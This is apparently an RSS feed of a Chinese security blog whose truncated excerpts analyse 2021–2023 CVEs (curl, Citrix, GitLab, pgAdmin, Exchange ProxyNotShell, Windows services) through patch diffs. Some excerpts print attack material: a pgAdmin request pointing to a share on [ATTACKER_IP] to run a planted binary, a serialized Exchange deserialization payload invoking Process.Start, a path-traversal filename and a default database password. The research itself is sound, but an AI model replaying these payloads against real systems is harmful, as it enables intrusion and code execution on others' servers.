<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞分析 on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link><description>Recent content in 漏洞分析 on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 13 Oct 2023 15:11:25 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/</link><pubDate>Fri, 13 Oct 2023 15:11:25 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/</guid><description>基本信息 利用 HTTP/2 的多路复用流功能，恶意攻击者可通过快速创建请求并立即重置请求，绕过最大并发流限制，导致服务器资源的过度消耗。
影响范围 Go &amp;lt; 1.21.3 Go &amp;lt; 1.20.10
11.0.0-M1 &amp;lt;= Apache Tomcat &amp;lt;= 11.0.0-M11 10.1.0-M1 &amp;lt;= Apache Tomcat &amp;lt;= 10.1.13 9.0.0-M1 &amp;lt;= Apache Tomcat &amp;lt;= 9.0.80 8.5.0 &amp;lt;= Apache Tomcat &amp;lt;= 8.5.9
grpc-go &amp;lt; 1.58.3 grpc-go &amp;lt; 1.57.1 grpc-go &amp;lt; 1.56.3
环境搭建 使用go起一个http2 server。
package main import ( &amp;#34;fmt&amp;#34; &amp;#34;net/http&amp;#34; ) func main() { http.HandleFunc(&amp;#34;/&amp;#34;, func(w http.ResponseWriter, r *http.Request) { fmt.Println(r.Proto, r.URL) fmt.Fprint(w, &amp;#34;Hello World!&amp;#34;) }) http.ListenAndServeTLS(&amp;#34;:443&amp;#34;, &amp;#34;certs/cert.</description></item><item><title>CVE-2023-38545 Curl 堆溢出漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/</link><pubDate>Wed, 11 Oct 2023 20:40:32 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/</guid><description>基本信息 在libcurl中存在堆溢出漏洞，当libcurl通过socks5代理发送请求时，如果hostname大于255则会在本地解析，但由于状态机错误导致没有按照预期解析，而是把主机名拷贝到缓冲区中，攻击者可以通过构造超长主机名触发堆溢出。
影响版本 7.69.0 &amp;lt;= libcurl &amp;lt;= 8.3.4
环境搭建 sudo apt-get build-dep curl autoreconf ./configure --with-openssl --prefix=$HOME/code/c/curl-8.3.0/build --enable-debug make -j 16 make install 技术分析&amp;amp;调试 补丁 漏洞在
fb4415d8aee6c1045be932a34fe6107c2f5ed147修复，修复代码如下 从修复代码中可以看出两个区别
当socks5_resolve_local=false and hostname_len &amp;gt;255 时返回CURLPX_LONG_HOSTNAME错误码，而原先逻辑为将socks5_resolve_local设为true 将hostname_len转为unsigned char后赋值给socksreq[len++] 修复代码位于do_SOCKS5函数，该函数由connect_SOCKS函数调用 static CURLcode connect_SOCKS(struct Curl_cfilter *cf, struct socks_state *sxstate, struct Curl_easy *data) { ...... switch(conn-&amp;gt;socks_proxy.proxytype) { case CURLPROXY_SOCKS5: case CURLPROXY_SOCKS5_HOSTNAME: pxresult = do_SOCKS5(cf, sxstate, data); break; 向上追溯connect_SOCKS由socks_proxy_cf_connect调用，socks_proxy_cf_connect被存储在了一个结构体中
static CURLcode socks_proxy_cf_connect(struct Curl_cfilter *cf, struct Curl_easy *data, bool blocking, bool *done) { CURLcode result; struct connectdata *conn = cf-&amp;gt;conn; int sockindex = cf-&amp;gt;sockindex; struct socks_state *sx = cf-&amp;gt;ctx; if(cf-&amp;gt;connected) { *done = TRUE; return CURLE_OK; } result = cf-&amp;gt;next-&amp;gt;cft-&amp;gt;do_connect(cf-&amp;gt;next, data, blocking, done); if(result || !</description></item><item><title>CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/</link><pubDate>Fri, 29 Sep 2023 20:32:52 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/</guid><description>基本信息 jumpserver中第三方库向用户公开了随机库所用的seed，并且没有限制重置密码接口的次数，导致攻击者可以获取到随机库的随机种子并尝试预测重置密码的验证码，进而重置任意用户密码。 利用该漏洞需要已知用户名和对应的邮箱。
指纹 hunter
web.title=&amp;#34;jumpserver&amp;#34; 影响版本 CVE-2023-42820 v2.24 - v3.6.4 环境搭建 参考
https://github.com/jumpserver/Dockerfile，将版本改为3.6.4，使用docker启动即可。
技术分析&amp;amp;调试 补丁分析 漏洞在commit 0eba6d2175ab752399c5aee2dbaaf311bf0a398d修复，查看补丁，可知在apps/common/utils/random.py#random_string处增加了 random.seed()调用，同时对 apps/users/models/user.py#generate_reset_token生成token改为增加了 random.seed调用的random_string函数 到这里只能隐约猜到是一个密码学有关的漏洞，应该可以通过爆破利用。
技术分析 在前两天有师傅写出了分析，才恍然大悟。
根据
jumpserver最新re-auth复现（伪随机经典案例）可知在本例的jumpserver中在如下地方生成重置密码时的验证码，其中使用了本次修复的函数 random_string生成6位，范围为000000-999999的数字验证码
opt/jumpserver/apps/authentication/api/password.py def create(self, request, *args, **kwargs): token = request.GET.get(&amp;#39;token&amp;#39;) userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse(&amp;#39;authentication:forgot-previewing&amp;#39;)) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get(&amp;#39;username&amp;#39;) form_type = serializer.validated_data[&amp;#39;form_type&amp;#39;] code = random_string(6, lower=False, upper=False) with open(&amp;#34;/tmp/code&amp;#34;,&amp;#34;a&amp;#34;) as f: f.write(code+&amp;#34;\n&amp;#34;) other_args = {} target = serializer.validated_data[form_type] if form_type == &amp;#39;sms&amp;#39;: query_key = &amp;#39;phone&amp;#39; target = target.</description></item><item><title>瑞友天翼 Rce分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/</link><pubDate>Wed, 20 Sep 2023 10:04:31 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/</guid><description>基本信息 环境搭建 略
影响版本 略
技术分析 数据库基本信息
127.0.0.1:5873 db: CASSystemDS pwd: F1B5214C user: admin 在ConsoleExternalApi.XGI中根据代码逻辑可得，请求中需携带initparams、key、sign等参数
$initparams = $_REQUEST[&amp;#39;initParams&amp;#39;]; $key = $_REQUEST[&amp;#39;key&amp;#39;]; $sign = $_REQUEST[&amp;#39;sign&amp;#39;]; 参数校验逻辑如下，此时直接使用key=inner绕过判断，则$keyVal值为Realor，下面拼接了$initparams和$keyVal并计算其md5值是否和sign变量相同。
if ($key == &amp;#34;wusuokey&amp;#34;) { $keyVal = $COMCASWEB-&amp;gt;getfarminfo($key); } else if ($key == &amp;#34;inner&amp;#34;) { $keyVal = &amp;#34;Realor&amp;#34;; } if (!isset($keyVal) || empty($keyVal)) { write_log(&amp;#34;{&amp;#39;参数非法&amp;#39;:&amp;#39;key值为空&amp;#39;}&amp;#34;); exitErrorJson(&amp;#39;参数非法&amp;#39;); } $signCalculate = md5($initparams . $keyVal); //testLog(&amp;#34;signCalculate=&amp;#34; . $signCalculate); if ($signCalculate != $sign) { write_log(&amp;#34;{&amp;#39;参数非法&amp;#39;:&amp;#39;参数加密方法错误&amp;#39;}&amp;#34;); exitErrorJson(&amp;#39;参数非法&amp;#39;); } 之后使用两个下划线分割$initparams变量，存入数组并遍历数组
// 两个下划线分割，变成一个数组，之后遍历数组，用一个下划线分割并变成键值对存入$requestObj变量中。 $paramArr = explode(&amp;#34;__&amp;#34;, $initparams); if (count($paramArr) == 0) { write_log(&amp;#34;{&amp;#39;参数非法&amp;#39;:&amp;#39;参数中未包含__&amp;#39;}&amp;#34;); exitErrorJson(&amp;#39;参数非法11&amp;#39;); } $requestObj = null; //testLog($paramArr); foreach ($paramArr as $key =&amp;gt; $value) { $keyValue = explode(&amp;#34;_&amp;#34;, $value); $requestObj[$keyValue[0]] = $keyValue[1]; } 之后从键值对数组中取出键为command的值，进行判断 $cmd = $requestObj['command']; 当$cmd为createUser时，从请求中取出POST body并尝试进行json decode，从中取出键为account的值拼接到sql语句中进行查询，此时可以使用单引号进行sql注入，借助union select into outfile语句写入webshell，达成代码执行。</description></item><item><title>CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/</link><pubDate>Tue, 19 Sep 2023 10:26:14 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/</guid><description>基本信息 Windows error resporting service中存在权限提升漏洞，当攻击者可以创建符号链接及目录时，可以利用这个漏洞提升至SYSTEM权限。
影响版本 略
环境搭建 Windows 10 21H2 6月补丁 技术分析&amp;amp;调试 补丁对比 diff wercplsupport.dll，主要改了CWerComReport::SubmitReport，wercplsupport.dll是Windows error reporting 服务的主dll文件。
对比发现补丁直接阻断了后续CAutoImpersonate::ImpersonateUserHighestPrivs和CWerComReport::_SubmitReport的调用
//未修复 __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)&amp;amp;v12), v10 &amp;gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)&amp;amp;v12); return (unsigned int)v10; } // 修复代码 __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v11; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; if ( (unsigned __int8)wil::details::FeatureImpl&amp;lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport&amp;gt;::__private_IsEnabled(&amp;amp;`wil::Feature&amp;lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport&amp;gt;::GetImpl&amp;#39;::`2&amp;#39;::impl) ) return 0x80004001i64; v12 = 2; if ( !</description></item><item><title>CVE-2023-38148 Windows Ics Rce分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/</link><pubDate>Mon, 18 Sep 2023 16:18:40 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/</guid><description>基本信息 依赖于ICS服务，Internet Connect Sharing，对应注册表，依赖ipnathlp.dll
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess 漏洞存在于处理DHCP请求时，由于没有检查边界，导致在使用memset时使用的长度参数来源于数据包内，可以导致栈溢出。 服务调试参考第二个参考链接。
影响版本 略
环境搭建 参考 https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md ，同时加一个Linux，网卡使用第二个网卡，使得Linux发出的DHCP包能够被Windows接收到。
技术分析&amp;amp;调试 静态分析 对比补丁修复前后的逻辑，有两个明显的不同点，有两种产生漏洞的可能的地方。
在修复版本中在进行 if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u )判断之前先调用了 DumpDhcpHeaderInfo，在漏洞代码中先进行判断在调用DumpDhcpHeaderInfo 在修复版本中如果满足 if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u ) 则进入if内，在结束if语句时会通过跳转略过一部分处理逻辑，而在未修复版本内则还会继续处理。 可以看出 a2 + 230为_NH_BUFFER 结构体内的某个长度字段，该处为判断这个长度字段存储的长度，该漏洞应该是溢出漏洞，并且在产生漏洞的地方需要读取该字段。
所以漏洞应该是第二点所说的，产生在略过的逻辑中。
// 未修复代码 void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... memset_0(&amp;amp;v12, 0, 0x40ui64); if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u ) { if ( v4 !</description></item><item><title>CVE-2023-3519 Cirtix Gateway RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/</link><pubDate>Thu, 27 Jul 2023 10:48:40 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/</guid><description>基本信息 Citrix ADC 及 Citrix Gateway 中存在缓冲区溢出漏洞，未授权的攻击者可以通过发送特殊请求触发漏洞，造成RCE。
影响版本 NetScaler ADC 、NetScaler Gateway 13.1 &amp;lt; 13.1-49.13 NetScaler ADC 、NetScaler Gateway 13.0 &amp;lt; 13.0-91.13 NetScaler ADC 13.1-FIPS &amp;lt; 13.1-37.159 NetScaler ADC 12.1-FIPS &amp;lt; 12.1-55.297 NetScaler ADC 12.1-NDcPP &amp;lt; 12.1-55.297
环境搭建 申请开发者试用，配置Citrix Gateway 技术分析&amp;amp;调试 根据国外安全研究员研究，该漏洞存在于/netscaler/nsppe文件内，diff修复前和修复后的nsppe，主要修改了ns_aaa_gwtest_get_event_and_target_names等几个函数 转到ns_aaa_gwtest_get_event_and_target_names函数，对比修复和未修复的代码，主要在调用ns_aaa_saml_url_decode函数时对v29添加了校验。 跟进ns_aaa_saml_url_decode函数，进入ns_aaa_saml_url_decode_inner
__int64 __fastcall ns_aaa_saml_url_decode(__int64 a1, __int64 a2, __int64 a3) { return ns_aaa_saml_url_decode_inner(a1, a2, a3, 1LL); } 在ns_aaa_saml_url_decode_inner函数中a1是一个char指针，指向了http请求的url，在do while循环时遍历a1数组，当当前a1指向的字符是%，则获取到该字符后面两个字符通过datatable_ascii2bin得到对应的字符并写入到v4指向的数组内，实际上这里是url解码操作，解码后写入v4数组。 如果当前字符不是%则判断是不是+号，是+号则在v4数组内写入空格。两个都不是则直接写入到v4内，可以看出这块代码是在对传入的字符串判断是否为url编码如果是则进行url解码，如果不是则直接写入v4数组。
__int64 __fastcall ns_aaa_saml_url_decode_inner(char *a1, _BYTE *a2, int a3, int a4) { _BYTE *v4; // rax unsigned __int64 v5; // r8 char v6; // bl char *v7; // r9 char v8; // r10 char v9; // r11 LODWORD(v4) = (_DWORD)a2; if ( a3 ) { v5 = (unsigned __int64)&amp;amp;a1[a3]; v4 = a2; do { v6 = *a1; if ( *a1 == &amp;#39;%&amp;#39; ) { v7 = a1 + 2; if ( (unsigned __int64)(a1 + 2) &amp;lt; v5 ) { v8 = a1[1]; if ( (unsigned __int8)(v8 - 48) &amp;lt;= 9u ) { v9 = *v7; if ( (unsigned __int8)(*v7 - 48) &amp;lt; 0xAu || (unsigned __int8)((v9 | 0x20) - 97) &amp;lt; 6u ) { if ( v9 !</description></item><item><title>CVE-2023-2825 Gitlab 路径穿越漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</link><pubDate>Fri, 26 May 2023 10:36:20 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</guid><description>基本信息 在GitLab 中，当一个附件存在于一个项目中，并且该项目在嵌套了至少五层的组内，攻击者才可以利用这个漏洞进行目录穿越，读取服务器上的文件。
影响版本 GitLab 16.0.0
环境搭建 用docker起环境
docker pull gitlab/gitlab-ce:16.0.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0 技术分析&amp;amp;调试 一开始以为是普通的目录穿越，先diff看怎么修的，注意到16.0.1新增了spec\support\shared_examples\requests\uploads_actions_shared_examples.rb 文件。
根据该文件内容判断应该是这个漏洞的单元测试文件，没学过ruby，先把这段代码扔给ChatGPT看看
# frozen_string_literal: true RSpec.shared_examples &amp;#39;uploads actions&amp;#39; do describe &amp;#34;GET #show&amp;#34; do context &amp;#39;with file traversal in filename parameter&amp;#39; do # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET let(:filename) { &amp;#34;../../../../../../../../../Gemfile.lock&amp;#34; } let(:escaped_filename) { CGI.</description></item><item><title>CVE-2022-4223 PgAdmin RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/</link><pubDate>Mon, 08 May 2023 14:18:21 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/</guid><description>基本信息 pgAdmin 服务器包含一个 HTTP API，用于验证用户选择的外部 PostgreSQL 实用程序（如 pg_dump 和 pg_restore）的路径。该实用程序由服务器执行，以确定它来自哪个PostgreSQL版本。6.17 之前的 pgAdmin 版本无法正确保护此 API，这可能允许未经身份验证的用户使用他们选择的路径调用它，例如他们在 Windows 计算机上控制的服务器的 UNC 路径。这将导致目标路径中正确命名的可执行文件由 pgAdmin 服务器执行。
指纹 略
影响版本 pgadmin &amp;lt; 6.17
环境搭建 windows 10 postgresql13 技术分析&amp;amp;调试 复现 直接安装postgresql13，自带了pgadmin4，初始化环境后，使用python 启动pgadmin4，编译如下代码
#include&amp;lt;stdlib&amp;gt; int main(){ system(&amp;#34;whoami &amp;gt; c:\\users\\public\\1.txt&amp;#34;); return 0; } 编译后命名为pg_dump.exe，将其放到某个目录内，并开启文件共享。 发送如下payload，在utility_path指向共享的文件夹路径，
POST /misc/validate_binary_path HTTP/1.1 Host: [TARGETHOST] Cookie: [COOKIES_YOU_FETCHED_IN_ADVANCE] X-pgA-CSRFToken: [CSRF_TOKEN_YOU_FETCHED_IN_ADVANCE] Connection: close Referer: https://[TARGETHOST]/browser/ Content-Length: [n] Content-Type: application/json {&amp;#34;utility_path&amp;#34;:&amp;#34;\\\\[ATTACKER_IP]\\[PREFERED_SHARE_NAME]&amp;#34;} 分析 在 validate_binary_path路由对应的处理函数如下，这个函数接收POST请求，而后获取到body里面的 utility_path，这个函数接收 utility_path并使用 os.path.abspath(os.path.join拼接路径，而 os.path.join可以接受[[UNC路径]]，所以我们可以搭建一个SMB服务器并在上面有 pg_dump.</description></item><item><title>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</link><pubDate>Fri, 05 May 2023 20:59:45 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</guid><description>基本信息 在http.sys中存在整数溢出漏洞，攻击者可以利用整数溢出漏洞绕过字段大小检查，导致在调用memcpy时传入超出缓冲区大小的长度参数，造成内存溢出。
环境搭建 操作系统 windows 10 调试器 windbg 技术分析&amp;amp;调试 PoC
#define _WIN32_WINNT 0x0A00 #define SECURITY_WIN32 #include &amp;lt;http.h&amp;gt; #include &amp;lt;sspi.h&amp;gt; #include &amp;lt;strsafe.h&amp;gt; #pragma warning(disable : 4127) // condition expression is constant int __cdecl wmain(int argc, __in_ecount(argc) wchar_t *argv[]) { HANDLE hReqQueue = NULL; HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2; HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID; ULONG retCode; HTTP_URL_GROUP_ID urlGroupId = HTTP_NULL_ID; // 初始化HTTP服务器驱动 retCode = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, // Flags NULL // Reserved ); if (retCode !</description></item><item><title>CVE-2023-28432 MinIO 信息泄露漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/</link><pubDate>Fri, 05 May 2023 20:53:41 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/</guid><description>基本信息 Minio是一个多云对象存储框架。在从 RELEASE.2019-12-17T23-16-33Z 开始且 RELEASE.2023-03-20T20-16-18Z 之前的集群部署中，MinIO 返回所有环境变量，包括“MINIO_SECRET_KEY”和“MINIO_ROOT_PASSWORD”，从而导致信息泄露。分布式部署的所有用户都会受到影响。建议所有用户升级到发布版本.2023-03-20T20-16-18Z。
指纹 web.title=&amp;ldquo;minio&amp;rdquo;
影响版本 2019-12-17t23-16-33z &amp;lt;= Minio &amp;lt; 2023-03-20t20-16-18z
环境搭建 使用Docker启动4个minio即可。
技术分析&amp;amp;调试 补丁分析 对比修复版本和未修复版本 https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z&amp;hellip;RELEASE.2023-03-20T20-16-18Z可知漏洞在commit https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077修复，查看修复代码，可以知道在 cmd/bootstrap-peer-server.go#VerifyHandler方法中增加了鉴权逻辑： func storageServerRequestValidate(r *http.Request) error { token, err := jwtreq.AuthorizationHeaderExtractor.ExtractToken(r) if err != nil { if err == jwtreq.ErrNoTokenInRequest { return errNoAuthToken } return errMalformedAuth } claims := xjwt.NewStandardClaims() if err = xjwt.ParseWithStandardClaims(token, claims, []byte(globalActiveCred.SecretKey)); err != nil { return errAuthentication } owner := claims.AccessKey == globalActiveCred.AccessKey || claims.</description></item><item><title>Proxy Not Shell 利用链分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</link><pubDate>Fri, 05 May 2023 20:35:49 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</guid><description>漏洞环境 Windows Server 2019 Windows Exchange 2019 CU9 漏洞分析 漏洞链包含了两个漏洞：
CVE-2022-41040 Exchange 权限提升漏洞 CVE-2022-41082 Exchange 远程代码执行漏洞 CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。
CVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。
在PoC中发送了以下三种类型的PSRP消息
0x00010002 SESSION_CAPABILITY
SESSION_CAPABILITY 应该是创建RunspacePool
0x00010004 INIT_RUNSPACEPOOL
INIT_RUNSPACEPOOL 应该是初始化RunspacePool
0x00021006 CREATE_PIPELINE
创建命令管道并在指定的 RunspacePool 中调用它
PoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。
PoC主要组成部分如下所示，BA标签内是base64编码的序列化System.UnitySerializationHolder对象
&amp;lt;Obj N=&amp;#34;V&amp;#34; RefId=&amp;#34;14&amp;#34;&amp;gt; &amp;lt;TN RefId=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;T&amp;gt;System.ServiceProcess.ServiceController&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;ToString&amp;gt;System.ServiceProcess.ServiceController&amp;lt;/ToString&amp;gt; &amp;lt;Props&amp;gt; &amp;lt;S N=&amp;#34;Name&amp;#34;&amp;gt;Type&amp;lt;/S&amp;gt; &amp;lt;Obj N=&amp;#34;TargetTypeForDeserialization&amp;#34;&amp;gt; &amp;lt;TN RefId=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;T&amp;gt;System.Exception&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;MS&amp;gt; &amp;lt;BA N=&amp;#34;SerializationData&amp;#34;&amp;gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=&amp;lt;/BA&amp;gt; &amp;lt;/MS&amp;gt; &amp;lt;/Obj&amp;gt; &amp;lt;/Props&amp;gt; &amp;lt;S&amp;gt; &amp;lt;![CDATA[&amp;lt;ResourceDictionary xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34; xmlns:System=&amp;#34;clr-namespace:System;assembly=mscorlib&amp;#34; xmlns:Diag=&amp;#34;clr-namespace:System.Diagnostics;assembly=system&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider x:Key=&amp;#34;LaunchCalch&amp;#34; ObjectType=&amp;#34;{x:Type Diag:Process}&amp;#34; MethodName=&amp;#34;Start&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider.</description></item><item><title>CVE-2021-40449 Win32k 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</link><pubDate>Tue, 09 Nov 2021 15:16:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</guid><description>CVE-2021-40449 Win32k提权漏洞及POC分析 背景 CVE-2021-40449是卡巴斯基实验室在2021年8月下旬到9月上旬在Windows服务器上捕获的恶意样本利用的提权漏洞，该漏洞存在于win32kfull.sys驱动内，利用该漏洞可以在windows中完成从users到system的权限提升。
基本概念 内核对象：内核对象即在内核空间存在的对象，只能由内核分配，内核访问。
内核对象的引用计数：在操作系统中，可能有多个进程访问同一个内核对象，如果没有进程需要使用该对象内核就应该释放该对象，所以为了准确的释放该对象就有了引用计数。当内核对象被创建时，引用计数被标记为1，调用CloseHandle()时内核对象的引用计数就-1，这可以类比Java GC的引用计数法：
在对象中添加一个引用计数器，每当一个地方引用它时，计数器就加一；当引用失效时，计数器值就减一；任何时刻计数器为零的对象就是不可能再被使用的。
句柄：由于内核对象只能由内核分配、访问、修改，当ring 3层的应用程序想要操作这些内核对象的时候，并不能直接操控内核对象。当内核对象创建好后，操作系统会使用一个句柄来标识该对象并返回给应用程序，应用程序通过操作系统提供的ring 3层API来操作句柄，ring3层API经过系统调用进入内核。在内核处句柄对应着具体的内核对象，这样ring3层的应用程序就可以通过操作句柄来间接操作内核对象。
句柄表：当一个进程初始化的时候，系统会给该进程分配一个句柄表，当进程创建内核对象的时候，内核创建对应内核对象，并遍历该进程的句柄表，在句柄表的空闲位置设置内核对象、对象指针等，并获取该位置的索引，作为进程创建对象的函数的返回值，即为句柄。
https://www.cnblogs.com/MisterXu/p/10846918.html
DC：是一个内核对象，全称device context，设备上下文对象
HDC：DC对象的句柄。
释放后重用：指一个内存空间被操作系统释放后，内存空间变为空闲状态，如果用户在这一刻申请内存，操作系统会优先分配刚释放的内存，则用户大概率可以申请到刚刚释放的内存并修改该内存空间的内容。如果在释放空间之前有指针指向该空间，在释放空间之后指针并未按照理想状态置为NULL，由于释放后可以重新申请该内存并修改内存内容，后续如果继续使用该指针，但内存内内容并不是预期的释放之前的内容，则会产生非预期行为。
eg：
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; void method(); void badMethod(); // 定义函数指针 typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new test对象 test *t = new test(); test *p = t; t-&amp;gt;p = method; p-&amp;gt;p(); // 释放t指向的test对象的空间 delete t; test *pt; for (size_t i = 0; i &amp;lt; 10000; i++) { // 占用刚释放的对象的内存空间 pt = (test *)malloc(sizeof(test)); // 将申请的空间当作test对象，并将对象的函数指针设置为恶意函数地址 pt-&amp;gt;p = badMethod; } // 这里原意想要调用method函数，但是实际调用了badMethod函数 printf(&amp;#34;第二次调用\n&amp;#34;); p-&amp;gt;p(); return 0; } void method() { printf(&amp;#34;method\n&amp;#34;); } void badMethod() { printf(&amp;#34;bad method\n&amp;#34;); } 漏洞形成分析 该漏洞产生于win32kfull!</description></item></channel></rss>